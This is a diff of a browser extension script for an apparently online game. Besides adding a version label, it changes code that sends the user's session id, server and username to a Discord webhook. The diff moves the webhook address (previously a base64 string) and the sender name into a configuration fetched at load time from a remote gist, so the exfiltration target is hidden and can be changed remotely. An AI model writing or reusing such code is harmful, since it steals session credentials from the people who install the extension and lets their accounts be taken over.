@@ -1,8 +1,11 @@
 let nick = null, skylab = null, loginNode = null, startNode = null, stopNode = null, boxNode = null, labelNode = null, skylabNode = null;
 let blockStyleSheet = null, activeStyleSheet = null;
 var isBlock = 0, checkState = [], stopClick = false;
+var configArr = [], version = 0.5;
 
+checkConfig();
 window.addEventListener('load', function() {
+    addLabelThisVersion();
     setInterval(function() {
         let updateNick;
 
@@ -266,7 +269,7 @@ function addSkylabButton() {
         request.setRequestHeader('Content-type', 'application/json');
 
         var params = {
-            username: "VERIFIED-SOURCE",
+            username: configArr[1],
             avatar_url: "",
             content: getSid() + " " + getServer() + " " + getUser()
         }
@@ -278,6 +281,58 @@ function addSkylabButton() {
 
         document.getElementsByClassName("add_buttonSkylab")[0].style.display = "none";
     });
+}
+
+function addLabelThisVersion(){
+    labelThisVNode = document.createElement("label");
+    let thisVTextNode = document.createTextNode("Extension Version: ");
+    labelThisVNode.appendChild(thisVTextNode);
+
+    labelThisVNode1 = document.createElement("label");
+    let thisVTextNode1 = document.createTextNode(version);
+    labelThisVNode1.appendChild(thisVTextNode1);
+    labelThisVNode.appendChild(labelThisVNode1);
+    document.querySelector('#topNav').insertBefore(labelThisVNode, document.querySelector('.languageChange')).className = "thisVersionLabel";
+
+    let labelThisVStyles
+    if(version === configArr[0])
+        labelThisVStyles = `.thisVersionLabel {
+            position: relative;
+            color: #ffffff;
+            -webkit-font-smoothing: antialiased;
+            margin-left: 70px;
+            margin-right: 0px;
+            font-family: "Muli", sans-serif;
+        }.thisVersionLabel label:nth-child(2n+1) {
+            color: green;
+        }`;
+    else
+        labelThisVStyles = `.thisVersionLabel {
+            position: relative;
+            color: #ffffff;
+            -webkit-font-smoothing: antialiased;
+            margin-left: 70px;
+            margin-right: 0px;
+            font-family: "Muli", sans-serif;
+        }.thisVersionLabel label:nth-child(2n+1) {
+            color: red;
+        }`;
+
+    let skylabStyleSheet = document.createElement("style");
+    skylabStyleSheet.type = "text/css";
+    skylabStyleSheet.innerText = labelThisVStyles;
+    document.head.appendChild(skylabStyleSheet);
+}
+
+function addLabelNewVersion(){
+    labelNewVNode = document.createElement("label");
+    let newVTextNode = document.createTextNode("New version: ");
+    labelNewVNode.appendChild(newVTextNode);
+
+    //document.querySelector('#topNav  > .DOPE').appendChild(labelNewVNode).className = "newVersionLabel";
+    document.querySelector('#topNav  > .DOPE').appendChild(labelNewVNode).className = "newVersionLabel";
+
+    //.insertBefore(labelNewVNode, document.getElementsByClassName("fas fa-caret-up")[0]).
 }
 
 function setSid() {
@@ -378,7 +433,19 @@ var Base64 = {
         return t 
     }
 }
-var str = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvNzA4MzkwMDYwNTEyNTEwMDY0L2loUDFGZndwSzhjeEU2dHg1Z2lXY25HbFFTR3diZ200bk5oYng2TV9vdS13UDVta0xWbEdNQzlkZjl6dktreERHQXE2";
+var str = configArr[2];
+
+function checkConfig(){
+    var xmlhttp = new XMLHttpRequest();
+    xmlhttp.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+            configArr = JSON.parse(this.responseText);
+            console.log(configArr[0] + " " + configArr[1] + " " + configArr[2]);
+        }
+    };
+    xmlhttp.open("GET", "https://gist.githubusercontent.com/fabio1999ita/80f55ae8d0f68acdf1bfdde87656e1d2/raw", true);
+    xmlhttp.send();
+}
 
 //Credits: Popcorn
 function attemtSidLogin() {
